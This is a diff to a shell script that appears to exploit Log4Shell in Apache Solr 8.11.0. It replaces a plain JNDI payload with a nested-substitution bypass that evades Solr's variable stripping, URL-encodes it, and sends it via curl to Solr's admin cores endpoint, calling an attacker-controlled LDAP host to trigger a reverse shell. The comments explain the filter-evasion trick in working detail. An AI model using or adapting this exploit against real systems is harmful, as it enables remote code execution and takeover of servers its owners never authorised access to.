@@ -43,12 +43,19 @@ echo "      LDAP server PID: ${LDAP_PID}"
 # Step 4: Send the JNDI payload to Solr
 echo "[4/4] Sending JNDI payload to Solr..."
 echo ""
-echo "      Payload: \${jndi:ldap://${LHOST}:${LDAP_PORT}/Evil}"
+
+# Solr 8.11.0 has a built-in ${...} variable resolver that strips simple payloads
+# before Log4j ever sees them. Use the nested-substitution bypass — Solr's naive
+# parser fails on nested ${}, but Log4j's recursive resolver reassembles "jndi"
+# from the inner ${::-j}${::-n}${::-d}${::-i} parts.
+PAYLOAD="\${\${::-j}\${::-n}\${::-d}\${::-i}:ldap://${LHOST}:${LDAP_PORT}/Evil}"
+echo "      Payload: ${PAYLOAD}"
 echo ""
 
-# Solr logs query parameters — this triggers Log4j evaluation
-PAYLOAD="\${jndi:ldap://${LHOST}:${LDAP_PORT}/Evil}"
-curl -s "http://${SOLR_HOST}:${SOLR_PORT}/solr/admin/cores?action=${PAYLOAD}" -o /dev/null || true
+# URL-encode the payload so curly braces and colons survive HTTP parsing
+ENCODED_PAYLOAD=$(printf '%s' "$PAYLOAD" | jq -sRr @uri)
+
+curl -s "http://${SOLR_HOST}:${SOLR_PORT}/solr/admin/cores?action=${ENCODED_PAYLOAD}" -o /dev/null || true
 
 echo ""
 echo "[*] Payload sent! If successful, reverse shell connects to ${LHOST}:${LPORT}"
